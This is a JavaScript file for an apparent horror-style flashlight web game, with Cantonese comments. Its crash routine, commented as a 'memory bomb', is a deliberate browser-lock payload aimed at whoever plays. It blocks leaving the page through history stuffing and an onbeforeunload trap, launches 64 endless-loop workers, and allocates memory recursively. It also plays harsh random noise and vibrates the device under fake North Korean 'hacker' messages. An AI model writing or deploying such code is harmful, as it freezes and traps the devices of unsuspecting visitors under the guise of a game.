let posX = -1000, posY = -1000;
let isLightOn = true; // 預設開啟手電筒，一入去就係黑嘅
let audioStarted = false;
let systemCrashed = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 隱藏說明文字
if(intro) intro.style.display = 'none';

// --- [機制：橘色小點] ---
function spawnSecretDot() {
    if(document.getElementById('secret-dot')) return;
    const dot = document.createElement('div');
    dot.id = 'secret-dot';
    dot.style.cssText = `
        position: absolute; width: 10px; height: 10px;
        background: #ff6600; border-radius: 50%;
        box-shadow: 0 0 15px #ff6600; cursor: pointer;
        z-index: 9999; left: 1500px; top: 1500px;
    `;
    dot.onclick = (e) => {
        e.stopPropagation();
        window.location.href = "your_other_website.html";
    };
    map.appendChild(dot);
}

// --- [機制：跨平台音頻] ---
function startCreepyVoice() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                output[i] = (Math.random() * 2 - 1) * 0.95;
            } else {
                let g = (t & (t >> 8)) ? 0.08 : -0.08;
                output[i] = (Math.random() * 0.1) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// --- [一鍵啟動遊戲 (Fullscreen + Audio + Dot + Hunter)] ---
function forceStartGame() {
    if (audioStarted) return;

    // 請求全螢幕
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    startCreepyVoice();
    spawnSecretDot();
    startHunterLogic(); // 啟動白點獵殺
}

// --- [機制：白點獵殺邏輯] ---
function startHunterLogic() {
    setTimeout(() => {
        if (systemCrashed) return;
        const glitchBlock = document.createElement('div');
        const side = Math.floor(Math.random() * 4);
        let startX, startY;
        if (side === 0) { startX = -100; startY = Math.random() * window.innerHeight; }
        else if (side === 1) { startX = window.innerWidth + 100; startY = Math.random() * window.innerHeight; }
        else if (side === 2) { startX = Math.random() * window.innerWidth; startY = -100; }
        else { startX = Math.random() * window.innerWidth; startY = window.innerHeight + 100; }

        glitchBlock.style.cssText = `
            position: fixed; width: 40px; height: 40px;
            background: white; z-index: 10001;
            left: ${startX}px; top: ${startY}px;
            box-shadow: 0 0 40px 10px white;
            transition: transform 0.05s linear;
            pointer-events: none;
        `;
        document.body.appendChild(glitchBlock);

        let currentX = startX;
        let currentY = startY;
        const speed = 4;

        const hunterInterval = setInterval(() => {
            if (systemCrashed) {
                clearInterval(hunterInterval);
                return;
            }

            const centerX = window.innerWidth / 2;
            const centerY = window.innerHeight / 2;
            const dx = centerX - (currentX + 20);
            const dy = centerY - (currentY + 20);
            const distance = Math.sqrt(dx * dx + dy * dy);

            if (distance < 30) {
                triggerFinalCrash();
                glitchBlock.remove();
                clearInterval(hunterInterval);
            } else {
                currentX += (dx / distance) * speed;
                currentY += (dy / distance) * speed;
                glitchBlock.style.left = `${currentX}px`;
                glitchBlock.style.top = `${currentY}px`;
                const scale = 1 + (200 / distance); 
                glitchBlock.style.transform = `scale(${scale})`;
                glitchBlock.style.opacity = Math.random() > 0.2 ? '1' : '0.5';
            }
        }, 16);
    }, 25000); // 25秒後白點出現
}

// --- [核心：終極封鎖 (朝鮮語版 + 記憶體炸彈)] ---
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    const dot = document.getElementById('secret-dot');
    if(dot) dot.remove();

    // 朝鮮語：나를 떠나지 마십시오 (請不要離開我)
    window.onbeforeunload = () => "나를 떠나지 마십시오."; 
    
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
            <h1 style="font-size:12vw; font-family:serif; text-shadow:0 0 40px red; margin:0;">나를 도와주세요.</h1>
            <p style="font-size:2vw; color:white; opacity:0.5;">ERROR: SYSTEM_FAILURE_PYONGYANG_NODE</p>
        </div>
    `;

    setTimeout(() => {
        if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);

        const crashAudio = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(() => {
            let osc = crashAudio.createOscillator();
            osc.type = 'sawtooth';
            osc.frequency.setValueAtTime(Math.random() * 8000, crashAudio.currentTime);
            osc.connect(crashAudio.destination);
            osc.start();
        }, 50);

        // 記憶體凍結機制
        function absoluteLock() {
            for (let i = 0; i < 200; i++) {
                history.pushState(null, null, "#" + Math.random());
            }
            const layer = document.createElement('div');
            layer.style.cssText = `position:fixed; top:0; left:0; width:1vw; height:1vw; backdrop-filter:blur(50px); z-index:10;`;
            document.getElementById('death-screen').appendChild(layer);
            const heavy = new Array(500000).fill("NORTH_KOREA_HACKER").join("!!");
            JSON.stringify(heavy);
            setTimeout(absoluteLock, 0);
        }

        const workerBlob = new Blob([`while(true){ postMessage(Math.random()); }`], {type: 'text/javascript'});
        const workerUrl = URL.createObjectURL(workerBlob);
        for (let i = 0; i < 64; i++) { new Worker(workerUrl); }

        absoluteLock();
    }, 100);
}

// --- [控制邏輯] ---

// 點擊任何地方即啟動
window.addEventListener('click', forceStartGame);
window.addEventListener('touchstart', (e) => {
    forceStartGame();
    if (!systemCrashed) posY += 30;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
    updateFlashlight();
});

window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    updateFlashlight();
});

window.addEventListener('keydown', (e) => {
    forceStartGame(); // 撳任何掣都啟動
    if (systemCrashed) return;
    let key = e.key.toLowerCase();
    
    if (key === '1') {
        isLightOn = !isLightOn;
        updateFlashlight();
    }
    
    const speed = 60;
    if (key === 'w') posY += speed;
    if (key === 's') posY -= speed;
    if (key === 'a') posX += speed;
    if (key === 'd') posX -= speed;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});

function updateFlashlight() {
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    } else {
        overlay.style.background = 'rgba(0,0,0,1)';
    }
}
